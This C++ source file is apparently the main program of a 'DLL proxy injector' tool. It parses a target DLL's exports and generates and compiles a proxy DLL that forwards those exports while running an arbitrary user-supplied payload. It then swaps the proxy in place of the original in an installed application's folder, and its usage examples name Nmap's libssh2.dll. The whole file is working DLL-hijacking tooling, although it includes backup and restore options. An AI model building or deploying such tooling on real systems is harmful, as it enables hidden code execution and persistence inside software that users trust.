#include "pe_parser.hpp"
#include "generator.hpp"
#include "compiler.hpp"

#include <windows.h>
#include <iostream>
#include <iomanip>
#include <vector>
#include <string>
#include <filesystem>

namespace fs = std::filesystem;

void enable_ansi_terminal() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut == INVALID_HANDLE_VALUE) return;
    DWORD dwMode = 0;
    if (GetConsoleMode(hOut, &dwMode)) {
        dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
        SetConsoleMode(hOut, dwMode);
    }
}

void print_banner() {
    std::cout << "\033[1;36m";
    std::cout << R"(
  ______           _         ____  _      _       
 |___  /          (_)       |  _ \| |    | |      
    / / ___  _ __  _ _ __   | | | | |    | |      
   / / / _ \| '__|| | '_ \  | | | | |    | |      
  / /_| (_) | |   | | | | | | |_| | |____| |____  
 /_____\___/|_|   |_|_| |_| |____/|______|______| 
    )" << "\033[0m\n";
    std::cout << "\033[1;32m  Zorin DLL Proxy Injector & Generator v1.0 [C++ Edition]\033[0m\n";
    std::cout << "\033[90m  Native PE Parser | Export Forwarding | Multi-Arch (x86/x64)\033[0m\n\n";
}

void print_usage(const char* prog_name) {
    std::cout << "\033[1mUSAGE:\033[0m\n";
    std::cout << "  " << prog_name << " <target_dll> <payload.c|cpp> [options]\n";
    std::cout << "  " << prog_name << " --list-exports <target_dll>\n";
    std::cout << "  " << prog_name << " --restore <target_dll>\n\n";

    std::cout << "\033[1mOPTIONS:\033[0m\n";
    std::cout << "  -o, --output <path>        Set custom output proxy DLL path (does not modify target)\n";
    std::cout << "  -b, --backup-suffix <sfx>  Backup suffix for original DLL (default: '_org')\n";
    std::cout << "  -g, --generate-only        Only generate source (.cpp), .def, and build script\n";
    std::cout << "  -c, --compile-only         Compile proxy DLL without replacing target\n";
    std::cout << "  -l, --list-exports         List all exports, ordinals, and architecture of a DLL\n";
    std::cout << "  -r, --restore              Restore original DLL from backup (<name><suffix>.dll)\n";
    std::cout << "  -d, --delay <ms>           Payload execution delay in milliseconds (default: 0)\n";
    std::cout << "  -f, --force                Overwrite existing backup or output files without prompting\n";
    std::cout << "  --dry-run                  Simulate actions and display analysis without writing\n";
    std::cout << "  -h, --help                 Display this help menu\n\n";

    std::cout << "\033[1mEXAMPLES:\033[0m\n";
    std::cout << "  # 1. Inspect exports of a target DLL:\n";
    std::cout << "  " << prog_name << " -l \"C:\\Program Files\\Nmap\\libssh2.dll\"\n\n";
    std::cout << "  # 2. Inject payload and replace DLL (with automatic backup):\n";
    std::cout << "  " << prog_name << " \"C:\\Program Files\\Nmap\\libssh2.dll\" payload.c\n\n";
    std::cout << "  # 3. Only generate source code & DEF without replacing:\n";
    std::cout << "  " << prog_name << " target.dll payload.cpp -g\n\n";
    std::cout << "  # 4. Restore original DLL:\n";
    std::cout << "  " << prog_name << " -r \"C:\\Program Files\\Nmap\\libssh2.dll\"\n\n";
}

int handle_list_exports(const fs::path& dll_path) {
    std::cout << "\033[1;34m[*] Analyzing PE exports for:\033[0m " << dll_path.string() << "\n\n";
    
    zorin::PeInfo pe_info;
    std::string err;
    if (!zorin::PeParser::parse(dll_path, pe_info, err)) {
        std::cerr << "\033[1;31m[✗] Failed to parse PE:\033[0m " << err << "\n";
        return 1;
    }

    std::cout << "  \033[1mArchitecture:\033[0m       " << pe_info.get_arch_string() << "\n";
    std::cout << "  \033[1mInternal Name:\033[0m      " << (pe_info.internal_name.empty() ? "(none)" : pe_info.internal_name) << "\n";
    std::cout << "  \033[1mOrdinal Base:\033[0m       " << pe_info.ordinal_base << "\n";
    std::cout << "  \033[1mTotal Functions:\033[0m    " << pe_info.total_functions << "\n";
    std::cout << "  \033[1mNamed Exports:\033[0m      " << pe_info.total_names << "\n";
    std::cout << "  \033[1mActive Exports:\033[0m     " << pe_info.exports.size() << "\n\n";

    if (pe_info.exports.empty()) {
        std::cout << "\033[1;33m[!] No exported functions found in this DLL.\033[0m\n";
        return 0;
    }

    std::cout << "\033[1;37m" 
              << std::left << std::setw(8) << "ORDINAL"
              << std::left << std::setw(12) << "RVA"
              << std::left << std::setw(38) << "NAME"
              << std::left << "FORWARDER"
              << "\033[0m\n";
    std::cout << std::string(75, '-') << "\n";

    for (const auto& sym : pe_info.exports) {
        std::string name = sym.name.empty() ? "[Ordinal Only]" : sym.name;
        std::stringstream rva_hex;
        rva_hex << "0x" << std::hex << std::uppercase << sym.rva;

        std::cout << std::left << std::setw(8) << sym.ordinal
                  << std::left << std::setw(12) << rva_hex.str()
                  << std::left << std::setw(38) << name
                  << (sym.is_forwarded ? ("-> " + sym.forwarder_str) : "")
                  << "\n";
    }

    std::cout << "\n\033[1;32m[✓] Analysis completed successfully.\033[0m\n";
    return 0;
}

int handle_restore(const fs::path& target_dll, const std::string& backup_suffix) {
    fs::path backup_path = target_dll.parent_path() / (target_dll.stem().string() + backup_suffix + target_dll.extension().string());

    std::cout << "\033[1;34m[*] Restoring original DLL...\033[0m\n";
    std::cout << "    Target: " << target_dll.string() << "\n";
    std::cout << "    Backup: " << backup_path.string() << "\n\n";

    if (!fs::exists(backup_path)) {
        std::cerr << "\033[1;31m[✗] Backup file does not exist:\033[0m " << backup_path.string() << "\n";
        return 1;
    }

    try {
        if (fs::exists(target_dll)) {
            fs::remove(target_dll);
        }
        fs::rename(backup_path, target_dll);
        std::cout << "\033[1;32m[✓] Successfully restored original DLL from backup!\033[0m\n";
        return 0;
    } catch (const std::exception& e) {
        std::cerr << "\033[1;31m[✗] Failed to restore DLL:\033[0m " << e.what() << "\n";
        return 1;
    }
}

int main(int argc, char* argv[]) {
    enable_ansi_terminal();
    print_banner();

    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    fs::path target_dll;
    fs::path payload_file;
    fs::path custom_output;
    std::string backup_suffix = "_org";
    bool generate_only = false;
    bool compile_only = false;
    bool list_exports_mode = false;
    bool restore_mode = false;
    bool dry_run = false;
    bool force = false;
    uint32_t delay_ms = 0;

    std::vector<std::string> positional;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "-h" || arg == "--help") {
            print_usage(argv[0]);
            return 0;
        } else if (arg == "-l" || arg == "--list-exports") {
            list_exports_mode = true;
        } else if (arg == "-r" || arg == "--restore") {
            restore_mode = true;
        } else if (arg == "-g" || arg == "--generate-only") {
            generate_only = true;
        } else if (arg == "-c" || arg == "--compile-only") {
            compile_only = true;
        } else if (arg == "--dry-run") {
            dry_run = true;
        } else if (arg == "-f" || arg == "--force") {
            force = true;
        } else if (arg == "-o" || arg == "--output") {
            if (i + 1 < argc) custom_output = argv[++i];
        } else if (arg == "-b" || arg == "--backup-suffix") {
            if (i + 1 < argc) backup_suffix = argv[++i];
        } else if (arg == "-d" || arg == "--delay") {
            if (i + 1 < argc) delay_ms = static_cast<uint32_t>(std::stoul(argv[++i]));
        } else if (!arg.empty() && arg[0] != '-') {
            positional.push_back(arg);
        } else {
            std::cerr << "\033[1;33m[!] Unknown option: " << arg << "\033[0m\n";
        }
    }

    if (list_exports_mode) {
        if (positional.empty()) {
            std::cerr << "\033[1;31m[✗] Error: Target DLL path is required for --list-exports\033[0m\n";
            return 1;
        }
        return handle_list_exports(positional[0]);
    }

    if (restore_mode) {
        if (positional.empty()) {
            std::cerr << "\033[1;31m[✗] Error: Target DLL path is required for --restore\033[0m\n";
            return 1;
        }
        return handle_restore(positional[0], backup_suffix);
    }

    if (positional.size() < 2) {
        std::cerr << "\033[1;31m[✗] Error: Both <target_dll> and <payload.c|cpp> are required.\033[0m\n\n";
        print_usage(argv[0]);
        return 1;
    }

    target_dll = positional[0];
    payload_file = positional[1];

    if (!fs::exists(target_dll)) {
        std::cerr << "\033[1;31m[✗] Target DLL not found:\033[0m " << target_dll.string() << "\n";
        return 1;
    }
    if (!fs::exists(payload_file)) {
        std::cerr << "\033[1;31m[✗] Payload file not found:\033[0m " << payload_file.string() << "\n";
        return 1;
    }

    std::cout << "\033[1;34m[*] Parsing target DLL:\033[0m " << target_dll.string() << "\n";
    zorin::PeInfo pe_info;
    std::string err;
    if (!zorin::PeParser::parse(target_dll, pe_info, err)) {
        std::cerr << "\033[1;31m[✗] Failed to parse target PE:\033[0m " << err << "\n";
        return 1;
    }

    std::cout << "    Architecture: " << pe_info.get_arch_string() << "\n";
    std::cout << "    Total Exports: " << pe_info.exports.size() << "\n\n";

    if (dry_run) {
        std::cout << "\033[1;33m[*] Dry-run mode enabled. No changes will be written.\033[0m\n";
        return 0;
    }

    // Configure generator
    zorin::GeneratorOptions gen_opts;
    gen_opts.target_dll = target_dll;
    gen_opts.payload_file = payload_file;
    gen_opts.output_dir = custom_output.empty() ? target_dll.parent_path() : custom_output.parent_path();
    gen_opts.backup_suffix = backup_suffix;
    gen_opts.delayed_execution = (delay_ms > 0);
    gen_opts.delay_ms = delay_ms;

    std::cout << "\033[1;34m[*] Generating proxy source and DEF export forwarder...\033[0m\n";
    zorin::GeneratedFiles gen_files;
    if (!zorin::Generator::generate(pe_info, gen_opts, gen_files, err)) {
        std::cerr << "\033[1;31m[✗] Generator failed:\033[0m " << err << "\n";
        return 1;
    }

    std::cout << "    [+] DEF file:      " << gen_files.def_file.string() << "\n";
    std::cout << "    [+] Proxy source:  " << gen_files.proxy_source.string() << "\n";
    std::cout << "    [+] Build script:  " << gen_files.build_script.string() << "\n\n";

    if (generate_only) {
        std::cout << "\033[1;32m[✓] Generation finished successfully (--generate-only).\033[0m\n";
        return 0;
    }

    // Compiler step
    std::cout << "\033[1;34m[*] Detecting system C/C++ compiler...\033[0m\n";
    auto compiler = zorin::Compiler::detect_compiler();
    if (compiler.type == zorin::CompilerType::None) {
        std::cerr << "\033[1;31m[✗] No compiler found.\033[0m Run the generated build script manually: " 
                  << gen_files.build_script.string() << "\n";
        return 1;
    }

    std::cout << "    [+] Detected: " << compiler.executable_name << " (" << compiler.version << ")\n";

    fs::path temp_proxy_dll = target_dll.parent_path() / (target_dll.stem().string() + "_temp.dll");
    fs::path final_output_dll = custom_output.empty() ? target_dll : custom_output;

    std::cout << "\033[1;34m[*] Compiling proxy DLL...\033[0m\n";
    std::string comp_log;
    bool ok = zorin::Compiler::compile_proxy_dll(
        compiler,
        gen_files.proxy_source,
        gen_files.def_file,
        temp_proxy_dll,
        pe_info.arch,
        comp_log
    );

    if (!ok) {
        std::cerr << "\033[1;31m[✗] Compilation failed!\033[0m\n" << comp_log << "\n";
        return 1;
    }

    uintmax_t compiled_size = fs::file_size(temp_proxy_dll);
    std::cout << "    [✓] Compilation successful! Output size: " << compiled_size << " bytes\n\n";

    if (compile_only || !custom_output.empty()) {
        try {
            if (fs::exists(final_output_dll) && !force) {
                fs::remove(final_output_dll);
            }
            fs::rename(temp_proxy_dll, final_output_dll);
            std::cout << "\033[1;32m[✓] Proxy DLL saved to: \033[0m" << final_output_dll.string() << "\n";
            return 0;
        } catch (const std::exception& e) {
            std::cerr << "\033[1;31m[✗] Error moving compiled DLL: \033[0m" << e.what() << "\n";
            return 1;
        }
    }

    // Full replacement mode
    fs::path backup_dll = target_dll.parent_path() / (target_dll.stem().string() + backup_suffix + target_dll.extension().string());

    if (fs::exists(backup_dll) && !force) {
        std::cout << "\033[1;33m[!] Backup already exists: " << backup_dll.string() << "\033[0m\n";
        std::cout << "    Overwrite backup? (y/N): ";
        char choice = 'n';
        std::cin >> choice;
        if (choice != 'y' && choice != 'Y') {
            std::cout << "[-] Aborted by user.\n";
            fs::remove(temp_proxy_dll);
            return 0;
        }
        fs::remove(backup_dll);
    }

    try {
        std::cout << "\033[1;34m[*] Performing atomic swap...\033[0m\n";
        if (fs::exists(target_dll)) {
            fs::rename(target_dll, backup_dll);
            std::cout << "    [✓] Original backed up to: " << backup_dll.filename().string() << "\n";
        }

        fs::rename(temp_proxy_dll, target_dll);
        std::cout << "    [✓] Proxy DLL installed in place: " << target_dll.filename().string() << "\n\n";

        // Cleanup temporary generated files
        fs::remove(gen_files.proxy_source);
        fs::remove(gen_files.def_file);

        std::cout << "\033[1;32m================================================================\033[0m\n";
        std::cout << "\033[1;32m[✓] INJECTION COMPLETED SUCCESSFULLY!\033[0m\n";
        std::cout << "\033[1;32m================================================================\033[0m\n";
        std::cout << "  • Original DLL Backup: " << backup_dll.string() << "\n";
        std::cout << "  • Active Proxy DLL:    " << target_dll.string() << "\n";
        std::cout << "  • To restore anytime:  " << argv[0] << " --restore \"" << target_dll.string() << "\"\n\n";

        return 0;
    } catch (const std::exception& e) {
        std::cerr << "\033[1;31m[✗] Error during DLL swap:\033[0m " << e.what() << "\n";
        // Attempt recovery if needed
        if (!fs::exists(target_dll) && fs::exists(backup_dll)) {
            fs::rename(backup_dll, target_dll);
            std::cout << "[*] Recovered original DLL\n";
        }
        return 1;
    }
}
